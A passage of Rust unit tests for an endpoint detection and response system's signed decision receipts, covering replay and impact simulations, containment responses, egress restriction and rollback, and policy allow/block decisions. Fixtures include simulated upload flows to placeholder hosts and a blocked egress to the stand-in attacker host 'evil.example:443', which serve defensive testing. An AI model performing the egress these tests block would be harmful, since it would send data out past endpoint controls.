        missing_identity_context
            .evidence
            .retain(|item| item.key != "affectedIdentityContext");
        assert!(missing_identity_context
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation affected identity context evidence"));

        let mut missing_tool_context = receipt.clone();
        missing_tool_context
            .evidence
            .retain(|item| item.key != "affectedToolContext");
        assert!(missing_tool_context
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation affected tool context evidence"));

        let mut mismatched_content_hash = receipt.clone();
        if let Some(content_hash_evidence) = mismatched_content_hash
            .evidence
            .iter_mut()
            .find(|item| item.key == "contentHash")
        {
            *content_hash_evidence = EndpointReceiptEvidence::hashed("contentHash", "sha256:other");
        }
        assert!(mismatched_content_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation content hash evidence hash"));

        let mut mismatched_root_reference = receipt.clone();
        mismatched_root_reference.graph.process_node_id = Some("node:other".to_string());
        if let Some(root_node_evidence) = mismatched_root_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "rootNodeId")
        {
            *root_node_evidence = EndpointReceiptEvidence::hashed("rootNodeId", "node:other");
        }
        assert!(mismatched_root_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation graph root reference"));

        let mut mismatched_graph_slice_reference = receipt.clone();
        mismatched_graph_slice_reference.graph.graph_slice_id =
            Some("graph_slice:other".to_string());
        if let Some(graph_slice_evidence) = mismatched_graph_slice_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "graphSliceId")
        {
            *graph_slice_evidence =
                EndpointReceiptEvidence::hashed("graphSliceId", "graph_slice:other");
        }
        assert!(mismatched_graph_slice_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("simulation graph slice reference"));
    }

    #[test]
    fn endpoint_policy_event_replay_receipt_binds_stream_graph_reference() {
        let keypair = hush_core::Keypair::from_seed(&[47u8; 32]);
        let event_stream_hash = sha256(b"event-stream").to_hex_prefixed();
        let result_hash = sha256(b"replay-result").to_hex_prefixed();
        let policy = EndpointPolicySnapshot {
            policy_version: "test-policy@1".to_string(),
            policy_hash: sha256(b"test-policy").to_hex_prefixed(),
            policy_epoch: 7,
        };
        let replay_id = endpoint_policy_event_replay_id(EndpointPolicyEventReplayIdInput {
            policy_hash: policy.policy_hash.as_str(),
            policy_epoch: policy.policy_epoch,
            event_stream_hash: &event_stream_hash,
            result_hash: &result_hash,
            event_count: 3,
            allowed_count: 1,
            warn_count: 1,
            blocked_count: 1,
            track_posture: true,
        });
        let mut receipt = EndpointDecisionReceipt::for_policy_event_replay(
            EndpointPolicyEventReplayReceiptInput {
                local_sequence: 47,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy,
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                replay_id: replay_id.as_str(),
                event_stream_hash: &event_stream_hash,
                result_hash: &result_hash,
                event_count: 3,
                allowed_count: 1,
                warn_count: 1,
                blocked_count: 1,
                track_posture: true,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::Simulation
        );
        assert_eq!(
            receipt.decision.rule_id.as_deref(),
            Some("endpoint.policy_event_replay")
        );
        assert_eq!(
            receipt.graph.graph_slice_id.as_deref(),
            Some(replay_id.as_str())
        );
        assert_eq!(
            receipt.graph.process_node_id.as_deref(),
            Some("policy_event_stream")
        );

        let mut mismatched_graph_slice = receipt.clone();
        mismatched_graph_slice.graph.graph_slice_id = Some("policy_event_replay:other".to_string());
        assert!(mismatched_graph_slice
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event replay graph slice reference"));

        let mut relabeled_replay_id = receipt.clone();
        relabeled_replay_id.decision.finding_id = Some("policy_event_replay:other".to_string());
        relabeled_replay_id.graph.graph_slice_id = Some("policy_event_replay:other".to_string());
        if let Some(replay_id_evidence) = relabeled_replay_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "replayId")
        {
            *replay_id_evidence =
                EndpointReceiptEvidence::hashed("replayId", "policy_event_replay:other");
        }
        assert!(relabeled_replay_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event replay id"));

        let mut mismatched_stream_node = receipt.clone();
        mismatched_stream_node.graph.process_node_id = Some("node:process-other".to_string());
        assert!(mismatched_stream_node
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event replay stream node reference"));

        let mut missing_stream_graph_node = receipt.clone();
        missing_stream_graph_node.graph.node_ids.clear();
        assert!(missing_stream_graph_node
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event replay stream node reference"));

        let mut missing_result_hash = receipt.clone();
        missing_result_hash
            .evidence
            .retain(|item| item.key != "resultHash");
        assert!(missing_result_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event replay result hash evidence"));

        let mut non_boolean_posture = receipt.clone();
        if let Some(posture_evidence) = non_boolean_posture
            .evidence
            .iter_mut()
            .find(|item| item.key == "trackPosture")
        {
            *posture_evidence = EndpointReceiptEvidence::hashed("trackPosture", "maybe");
        }
        assert!(non_boolean_posture
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event replay posture evidence"));
    }

    #[test]
    fn endpoint_policy_event_impact_receipt_binds_stream_graph_reference() {
        let keypair = hush_core::Keypair::from_seed(&[48u8; 32]);
        let event_stream_hash = sha256(b"event-stream").to_hex_prefixed();
        let current_result_hash = sha256(b"current-result").to_hex_prefixed();
        let proposed_result_hash = sha256(b"proposed-result").to_hex_prefixed();
        let impact_hash = sha256(b"impact").to_hex_prefixed();
        let proposed_policy_hash = sha256(b"proposed-policy").to_hex_prefixed();
        let policy = EndpointPolicySnapshot {
            policy_version: "test-policy@1".to_string(),
            policy_hash: sha256(b"test-policy").to_hex_prefixed(),
            policy_epoch: 7,
        };
        let impact_id = endpoint_policy_event_impact_id(EndpointPolicyEventImpactIdInput {
            current_policy_hash: policy.policy_hash.as_str(),
            current_policy_epoch: policy.policy_epoch,
            proposed_policy_hash: &proposed_policy_hash,
            proposed_policy_epoch: 8,
            event_stream_hash: &event_stream_hash,
            current_result_hash: &current_result_hash,
            proposed_result_hash: &proposed_result_hash,
            impact_hash: &impact_hash,
            event_count: 3,
            changed_count: 2,
            allow_to_block_count: 1,
            track_posture: true,
        });
        let mut receipt = EndpointDecisionReceipt::for_policy_event_impact(
            EndpointPolicyEventImpactReceiptInput {
                local_sequence: 48,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy,
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                impact_id: impact_id.as_str(),
                event_stream_hash: &event_stream_hash,
                current_result_hash: &current_result_hash,
                proposed_result_hash: &proposed_result_hash,
                impact_hash: &impact_hash,
                proposed_policy_hash: &proposed_policy_hash,
                proposed_policy_epoch: 8,
                event_count: 3,
                changed_count: 2,
                allow_to_block_count: 1,
                track_posture: true,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::Simulation
        );
        assert_eq!(
            receipt.decision.rule_id.as_deref(),
            Some("endpoint.policy_event_impact")
        );
        assert_eq!(
            receipt.graph.graph_slice_id.as_deref(),
            Some(impact_id.as_str())
        );
        assert_eq!(
            receipt.graph.process_node_id.as_deref(),
            Some("policy_event_stream")
        );

        let mut mismatched_graph_slice = receipt.clone();
        mismatched_graph_slice.graph.graph_slice_id = Some("policy_event_impact:other".to_string());
        assert!(mismatched_graph_slice
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event impact graph slice reference"));

        let mut relabeled_impact_id = receipt.clone();
        relabeled_impact_id.decision.finding_id = Some("policy_event_impact:other".to_string());
        relabeled_impact_id.graph.graph_slice_id = Some("policy_event_impact:other".to_string());
        if let Some(impact_id_evidence) = relabeled_impact_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "impactId")
        {
            *impact_id_evidence =
                EndpointReceiptEvidence::hashed("impactId", "policy_event_impact:other");
        }
        assert!(relabeled_impact_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event impact id"));

        let mut mismatched_stream_node = receipt.clone();
        mismatched_stream_node.graph.process_node_id = Some("node:process-other".to_string());
        assert!(mismatched_stream_node
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event impact stream node reference"));

        let mut missing_stream_graph_node = receipt.clone();
        missing_stream_graph_node.graph.node_ids.clear();
        assert!(missing_stream_graph_node
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event impact stream node reference"));

        let mut missing_impact_hash = receipt.clone();
        missing_impact_hash
            .evidence
            .retain(|item| item.key != "impactHash");
        assert!(missing_impact_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event impact hash evidence"));

        let mut non_boolean_posture = receipt.clone();
        if let Some(posture_evidence) = non_boolean_posture
            .evidence
            .iter_mut()
            .find(|item| item.key == "trackPosture")
        {
            *posture_evidence = EndpointReceiptEvidence::hashed("trackPosture", "maybe");
        }
        assert!(non_boolean_posture
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy event impact posture evidence"));
    }

    #[test]
    fn endpoint_response_metadata_deserialization_rejects_unknown_fields() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "egress.example.invalid".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://egress.example.invalid/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::restrict_egress_execution(
            &process_node_id,
            &subgraph,
            600,
            "restrict observed egress",
        );
        assert_unknown_field_rejected::<EndpointResponsePlan>(
            serde_json::to_value(&plan).unwrap(),
            "shadowTtlSeconds",
        );

        let targets = vec!["egress.example.invalid:443".to_string()];
        let mut execution =
            EndpointResponseExecutionReport::restrict_egress(&plan, &subgraph, &targets).unwrap();
        execution.actor = Some(response_actor("endpoint-1"));
        assert_unknown_field_rejected::<EndpointResponseExecutionReport>(
            serde_json::to_value(&execution).unwrap(),
            "shadowExecutionStatus",
        );
        assert_unknown_field_rejected::<EndpointEvidenceBundleReference>(
            serde_json::to_value(&execution.evidence_bundle).unwrap(),
            "shadowBundleHash",
        );
        assert_unknown_field_rejected::<EndpointResponseExecutionEffect>(
            serde_json::to_value(&execution.effects[0]).unwrap(),
            "shadowEffectTarget",
        );

        let rollback = EndpointResponseRollbackReport::restrict_egress(
            &execution,
            "restore egress",
            execution.completed_at + chrono::Duration::seconds(1),
        )
        .unwrap();
        assert_unknown_field_rejected::<EndpointResponseRollbackReport>(
            serde_json::to_value(&rollback).unwrap(),
            "shadowRollbackStatus",
        );

        let control = EndpointResponseControlCorrelation {
            response_action_id: execution.action_id.clone(),
            delivery_id: Some("delivery:test".to_string()),
            target_kind: "endpoint".to_string(),
            target_id: "endpoint-1".to_string(),
            ack_token_hash: sha256(b"ack-token").to_hex_prefixed(),
            ack_status: "acknowledged".to_string(),
            resulting_state: Some("contained".to_string()),
        };
        assert_unknown_field_rejected::<EndpointResponseControlCorrelation>(
            serde_json::to_value(&control).unwrap(),
            "shadowAckToken",
        );

        let acknowledgement = EndpointResponseAcknowledgementReport::from_execution(
            &execution,
            "operator:test",
            Some("operator acknowledged response".to_string()),
            execution.completed_at + chrono::Duration::seconds(2),
        )
        .with_control_correlation(Some(control));
        assert_unknown_field_rejected::<EndpointResponseAcknowledgementReport>(
            serde_json::to_value(&acknowledgement).unwrap(),
            "shadowAcknowledgedBy",
        );
    }

    #[test]
    fn endpoint_response_request_receipt_requires_ttl_rollback_and_graph_target() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "egress.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://egress.example/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::dry_run(
            EndpointDecisionAction::RestrictEgress,
            &process_node_id,
            &subgraph,
            600,
            "contain process tree",
        );
        let keypair = hush_core::Keypair::from_seed(&[11u8; 32]);
        let mut receipt =
            EndpointDecisionReceipt::for_response_request(EndpointResponseReceiptInput {
                local_sequence: 10,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                plan: &plan,
                graph: &subgraph,
            });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::ResponseRequest
        );
        assert_eq!(receipt.decision.ttl_seconds, Some(600));
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(
            receipt.graph.process_node_id.as_deref(),
            Some(process_node_id.as_str())
        );
        assert_eq!(receipt.decision.confidence, Some(1.0));
        assert_eq!(
            receipt.actor.session_id.as_deref(),
            Some("session-response")
        );
        assert_eq!(receipt.actor.posture.as_deref(), Some("restricted"));
        assert!(receipt.evidence.iter().any(|item| item.key == "actorHash"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "contentHash"));

        let terminate_dry_run_plan = EndpointResponsePlan::dry_run(
            EndpointDecisionAction::TerminateProcessTree,
            &process_node_id,
            &subgraph,
            600,
            "model terminate process tree only",
        );
        let mut terminate_dry_run_receipt =
            EndpointDecisionReceipt::for_response_request(EndpointResponseReceiptInput {
                local_sequence: 11,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                plan: &terminate_dry_run_plan,
                graph: &subgraph,
            });
        terminate_dry_run_receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());
        let signed_terminate_dry_run = terminate_dry_run_receipt.sign_with(&keypair).unwrap();
        assert!(
            signed_terminate_dry_run
                .verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()))
                .valid
        );
        assert_eq!(
            terminate_dry_run_receipt.decision.action,
            EndpointDecisionAction::TerminateProcessTree
        );

        let mut terminate_live_plan = terminate_dry_run_plan.clone();
        terminate_live_plan.dry_run = false;
        let terminate_live_ttl = terminate_live_plan.ttl_seconds.to_string();
        terminate_live_plan.action_id = stable_id(
            "response_action",
            [
                terminate_live_plan.root_node_id.as_str(),
                terminate_live_plan.graph_slice_id.as_str(),
                terminate_live_plan.action.as_str(),
                "execute",
                terminate_live_ttl.as_str(),
            ],
        );
        terminate_live_plan.rollback_ref = format!("rollback:{}", terminate_live_plan.action_id);
        let mut terminate_live_receipt =
            EndpointDecisionReceipt::for_response_request(EndpointResponseReceiptInput {
                local_sequence: 12,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                plan: &terminate_live_plan,
                graph: &subgraph,
            });
        terminate_live_receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());
        let err = terminate_live_receipt.sign_with(&keypair).unwrap_err();
        assert!(err.to_string().contains("dry-run response requests"));

        let mut missing_actor_context = receipt.clone();
        missing_actor_context.actor.host_id = None;
        missing_actor_context.actor.user_id = None;
        missing_actor_context.actor.session_id = None;
        missing_actor_context.actor.posture = None;
        missing_actor_context.actor.agent_id = None;
        missing_actor_context.actor.workload_id = None;
        missing_actor_context.actor.approval_id = None;
        assert!(missing_actor_context
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response actor context"));

        let mut missing_actor_hash = receipt.clone();
        missing_actor_hash
            .evidence
            .retain(|item| item.key != "actorHash");
        assert!(missing_actor_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response actor evidence"));

        let mut mismatched_actor_hash = receipt.clone();
        if let Some(actor_hash_evidence) = mismatched_actor_hash
            .evidence
            .iter_mut()
            .find(|item| item.key == "actorHash")
        {
            *actor_hash_evidence = EndpointReceiptEvidence::hashed("actorHash", "actor:other");
        }
        assert!(mismatched_actor_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response actor evidence hash"));

        let mut missing_ttl = receipt.clone();
        missing_ttl.decision.ttl_seconds = None;
        assert!(missing_ttl
            .validate()
            .unwrap_err()
            .to_string()
            .contains("ttl"));

        let mut missing_rollback = receipt.clone();
        missing_rollback.decision.rollback_ref = None;
        assert!(missing_rollback
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback"));

        let mut missing_confidence = receipt.clone();
        missing_confidence.decision.confidence = None;
        assert!(missing_confidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("confidence"));

        let mut missing_ttl_evidence = receipt.clone();
        missing_ttl_evidence
            .evidence
            .retain(|item| item.key != "ttlSeconds");
        assert!(missing_ttl_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response ttl evidence"));

        let mut missing_rollback_evidence = receipt.clone();
        missing_rollback_evidence
            .evidence
            .retain(|item| item.key != "rollbackRef");
        assert!(missing_rollback_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response rollback evidence"));

        let mut missing_content_hash_evidence = receipt.clone();
        missing_content_hash_evidence
            .evidence
            .retain(|item| item.key != "contentHash");
        assert!(missing_content_hash_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response graph content hash evidence"));

        let mut mismatched_ttl_evidence = receipt.clone();
        if let Some(ttl_evidence) = mismatched_ttl_evidence
            .evidence
            .iter_mut()
            .find(|item| item.key == "ttlSeconds")
        {
            *ttl_evidence = EndpointReceiptEvidence::hashed("ttlSeconds", "601");
        }
        assert!(mismatched_ttl_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response ttl evidence hash"));

        let mut mismatched_rollback_evidence = receipt.clone();
        if let Some(rollback_evidence) = mismatched_rollback_evidence
            .evidence
            .iter_mut()
            .find(|item| item.key == "rollbackRef")
        {
            *rollback_evidence = EndpointReceiptEvidence::hashed("rollbackRef", "rollback:other");
        }
        assert!(mismatched_rollback_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response rollback evidence hash"));

        let mut mismatched_content_hash_evidence = receipt.clone();
        if let Some(content_hash_evidence) = mismatched_content_hash_evidence
            .evidence
            .iter_mut()
            .find(|item| item.key == "contentHash")
        {
            *content_hash_evidence = EndpointReceiptEvidence::hashed("contentHash", "sha256:other");
        }
        assert!(mismatched_content_hash_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response graph content hash evidence hash"));

        let mut relabeled_action_contract = receipt.clone();
        relabeled_action_contract.decision.finding_id = Some("response_action:other".to_string());
        relabeled_action_contract.decision.rollback_ref =
            Some("rollback:response_action:other".to_string());
        if let Some(response_action_id_evidence) = relabeled_action_contract
            .evidence
            .iter_mut()
            .find(|item| item.key == "responseActionId")
        {
            *response_action_id_evidence =
                EndpointReceiptEvidence::hashed("responseActionId", "response_action:other");
        }
        if let Some(rollback_evidence) = relabeled_action_contract
            .evidence
            .iter_mut()
            .find(|item| item.key == "rollbackRef")
        {
            *rollback_evidence =
                EndpointReceiptEvidence::hashed("rollbackRef", "rollback:response_action:other");
        }
        assert!(relabeled_action_contract
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response action id evidence hash"));

        let mut mismatched_dry_run_evidence = receipt.clone();
        if let Some(dry_run_evidence) = mismatched_dry_run_evidence
            .evidence
            .iter_mut()
            .find(|item| item.key == "dryRun")
        {
            *dry_run_evidence = EndpointReceiptEvidence::hashed("dryRun", "false");
        }
        assert!(mismatched_dry_run_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response dry-run evidence hash"));

        let mut mismatched_root_reference = receipt.clone();
        mismatched_root_reference.graph.process_node_id = Some("node:other".to_string());
        if let Some(root_node_evidence) = mismatched_root_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "rootNodeId")
        {
            *root_node_evidence = EndpointReceiptEvidence::hashed("rootNodeId", "node:other");
        }
        assert!(mismatched_root_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response graph root reference"));

        let mut mismatched_graph_slice_reference = receipt.clone();
        mismatched_graph_slice_reference.graph.graph_slice_id =
            Some("graph_slice:other".to_string());
        if let Some(graph_slice_evidence) = mismatched_graph_slice_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "graphSliceId")
        {
            *graph_slice_evidence =
                EndpointReceiptEvidence::hashed("graphSliceId", "graph_slice:other");
        }
        assert!(mismatched_graph_slice_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response graph slice reference"));

        let mut empty_reason_evidence = receipt.clone();
        if let Some(reason_evidence) = empty_reason_evidence
            .evidence
            .iter_mut()
            .find(|item| item.key == "reason")
        {
            *reason_evidence = EndpointReceiptEvidence::hashed("reason", "");
        }
        assert!(empty_reason_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response reason evidence"));

        let mut non_response_action = receipt;
        non_response_action.decision.action = EndpointDecisionAction::Observe;
        assert!(non_response_action
            .validate()
            .unwrap_err()
            .to_string()
            .contains("response action"));
    }

    #[test]
    fn endpoint_restrict_egress_execution_receipt_binds_targets_and_rollback() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "egress.example.invalid".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://egress.example.invalid/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let targets = vec!["egress.example.invalid:443".to_string()];
        let plan = EndpointResponsePlan::restrict_egress_execution(
            &process_node_id,
            &subgraph,
            600,
            "restrict observed egress",
        );
        let execution =
            EndpointResponseExecutionReport::restrict_egress(&plan, &subgraph, &targets).unwrap();

        assert_eq!(execution.action, EndpointDecisionAction::RestrictEgress);
        assert_eq!(execution.status, EndpointResponseExecutionStatus::Succeeded);
        assert_eq!(execution.effects[0].effect_type, "restrict_egress");
        assert_eq!(
            execution.effects[0].target,
            "egress:egress.example.invalid:443"
        );
        assert_eq!(
            execution.effects[0].artifact.as_deref(),
            Some("egress.example.invalid:443")
        );
        assert_eq!(execution.effects[0].byte_count, Some(1));

        let rollback = EndpointResponseRollbackReport::restrict_egress(
            &execution,
            "restore egress",
            execution.completed_at + chrono::Duration::seconds(1),
        )
        .unwrap();
        assert_eq!(rollback.action, EndpointDecisionAction::RestrictEgress);
        assert_eq!(rollback.effects[0].effect_type, "restore_egress");
        assert_eq!(
            rollback.effects[0].content_hash,
            execution.effects[0].content_hash
        );
        assert_eq!(rollback.effects[0].byte_count, Some(1));
    }

    #[test]
    fn endpoint_policy_decision_receipt_signs_allow_and_block() {
        let keypair = hush_core::Keypair::from_seed(&[18u8; 32]);
        let policy = EndpointPolicySnapshot {
            policy_version: "test-policy@1".to_string(),
            policy_hash: sha256(b"test-policy").to_hex_prefixed(),
            policy_epoch: 7,
        };
        let sensor_state = EndpointSensorState::single_active_agent("agent-api:test");
        let actor = EndpointDecisionActor {
            endpoint_id: "endpoint-1".to_string(),
            session_id: Some("session-1".to_string()),
            agent_id: Some("agent:codex".to_string()),
            workload_id: Some("local-agent".to_string()),
            ..EndpointDecisionActor::default()
        };
        let details = serde_json::json!({
            "reason": "developer_tool_allowed"
        });
        let mut allowed_receipt =
            EndpointDecisionReceipt::for_policy_decision(EndpointPolicyDecisionReceiptInput {
                local_sequence: 17,
                signer_identity: "local-edr:endpoint-1",
                actor: actor.clone(),
                policy: policy.clone(),
                sensor_state: sensor_state.clone(),
                action_type: "mcp_tool",
                target: "openclaw.list",
                allowed: true,
                guard: Some("developer_tool_allowlist"),
                severity: Some(DetectionSeverity::Info),
                severity_label: Some("info"),
                message: Some("allowed by developer tool allowlist"),
                details: Some(&details),
            });
        allowed_receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = allowed_receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));
        assert!(verification.valid);
        assert_eq!(
            allowed_receipt.receipt_family,
            EndpointDecisionReceiptFamily::PolicyDecision
        );
        assert_eq!(
            allowed_receipt.decision.action,
            EndpointDecisionAction::Allow
        );
        assert!(allowed_receipt.decision.passed);
        assert_eq!(
            allowed_receipt.actor.agent_id.as_deref(),
            Some("agent:codex")
        );

        let mut mismatched_allowed = allowed_receipt.clone();
        if let Some(allowed_evidence) = mismatched_allowed
            .evidence
            .iter_mut()
            .find(|item| item.key == "allowed")
        {
            *allowed_evidence = EndpointReceiptEvidence::hashed("allowed", "false");
        }
        assert!(mismatched_allowed
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy decision allowed evidence hash"));

        let mut mismatched_action_type = allowed_receipt.clone();
        if let Some(action_type_evidence) = mismatched_action_type
            .evidence
            .iter_mut()
            .find(|item| item.key == "actionType")
        {
            *action_type_evidence = EndpointReceiptEvidence::hashed("actionType", "egress");
        }
        assert!(mismatched_action_type
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy decision action type evidence hash"));

        let mut missing_target = allowed_receipt.clone();
        missing_target.evidence.retain(|item| item.key != "target");
        assert!(missing_target
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy decision target evidence"));

        let mut relabeled_policy_decision_id = allowed_receipt.clone();
        relabeled_policy_decision_id.decision.finding_id =
            Some("policy_decision:other".to_string());
        assert!(relabeled_policy_decision_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("policy decision id"));

        let mut blocked_receipt =
            EndpointDecisionReceipt::for_policy_decision(EndpointPolicyDecisionReceiptInput {
                local_sequence: 18,
                signer_identity: "local-edr:endpoint-1",
                actor,
                policy,
                sensor_state,
                action_type: "egress",
                target: "evil.example:443",
                allowed: false,
                guard: Some("deny_unknown_egress"),
                severity: Some(DetectionSeverity::High),
                severity_label: Some("high"),
                message: Some("unknown egress blocked"),
                details: None,
            });
        blocked_receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = blocked_receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));
        assert!(verification.valid);
        assert_eq!(
            blocked_receipt.decision.action,
            EndpointDecisionAction::Block
        );
        assert!(!blocked_receipt.decision.passed);
        assert!(blocked_receipt
            .evidence
            .iter()
            .any(|item| item.key == "target"));
    }

    #[test]
    fn endpoint_collect_evidence_execution_receipt_binds_bundle_and_graph() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "evidence.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://evidence.example/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::collect_evidence_execution(
            &process_node_id,
            &subgraph,
            600,
            "collect evidence graph slice",
        );
        let execution = EndpointResponseExecutionReport::collect_evidence(&plan, &subgraph)
            .unwrap_or_else(|err| panic!("failed to collect evidence report: {err}"));
        let keypair = hush_core::Keypair::from_seed(&[13u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 12,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &execution,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::ResponseExecution
        );
        assert_eq!(
            receipt.decision.finding_id.as_deref(),
            Some(execution.execution_id.as_str())
        );
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(receipt.decision.ttl_seconds, Some(600));
        assert_eq!(
            receipt.graph.process_node_id.as_deref(),
            Some(process_node_id.as_str())
        );

        let mut missing_bundle_content_hash = receipt.clone();
        missing_bundle_content_hash
            .evidence
            .retain(|item| item.key != "evidenceBundleContentHash");
